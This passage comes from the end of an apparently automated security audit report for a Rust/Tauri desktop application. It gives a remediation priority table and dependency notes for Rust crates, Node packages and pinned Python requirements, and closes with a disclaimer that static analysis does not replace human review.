| P4 — Post-v1.0 | LOW-4: Cap case notes length | Tiny | Low — **FIXED** |
| P4 — Post-v1.0 | INFO-1: Redirect limit + DNS rebinding protection | Medium | Low-Medium — still open |
| P4 — Post-v1.0 | INFO-3: Pin `blind_watermark` to exact version | Tiny | Low — still open |

---

## Dependency Notes

### Rust (Cargo.toml) — No `cargo audit` run (Bash not available)

Packages of interest for manual review against the RustSec Advisory Database:

| Crate | Version | Notes |
|-------|---------|-------|
| `rusqlite` | 0.31 | Bundled SQLite — check RustSec for SQLite CVEs |
| `c2pa` | 0.76 | Active development; check for JUMBF/CBOR parser advisories |
| `blind_watermark` | 0.1 | Pre-stability; no known CVEs; pin to exact version |
| `reqwest` | 0.12 | Actively maintained; check for TLS/redirect CVEs |
| `image` | 0.25 | Image parsing; historically had decompression vulnerabilities |
| `kamadak-exif` | 0.5 | EXIF parsing; relatively stable |

**Recommendation**: Add `cargo audit` as a CI step (it may already exist — verify `.github/workflows/ci.yml`). Run `cargo audit` locally before the v1.0 release tag.

### Node (package.json) — No `npm audit` run

All dependencies in `package.json` are `devDependencies` (build tools) except:
- `@tauri-apps/api`, `@tauri-apps/plugin-*` — Tauri maintained, track Tauri releases
- `jspdf` — PDF generation; check for XSS in PDF content injection
- `jszip` — ZIP generation; check for path traversal in ZIP entries

Neither `jspdf` nor `jszip` processes user-supplied archive paths in a security-sensitive way in this application. No current concerns identified without running `npm audit`.

### Python (requirements.txt)

`pip-audit` is confirmed running in CI per the CHANGELOG. Key pinned packages:
- `scikit-learn==1.8.0` — confirmed pinned
- `scikit-image==0.26.0` — confirmed pinned
- `chromadb==0.5.23` — confirmed pinned

See MEDIUM-5 for unpinned packages.

---

*This report was produced by automated static analysis of source code. It does not substitute for dynamic penetration testing, fuzzing, or manual security review by a qualified human assessor. All findings should be triaged against the project's threat model before remediation prioritisation.*
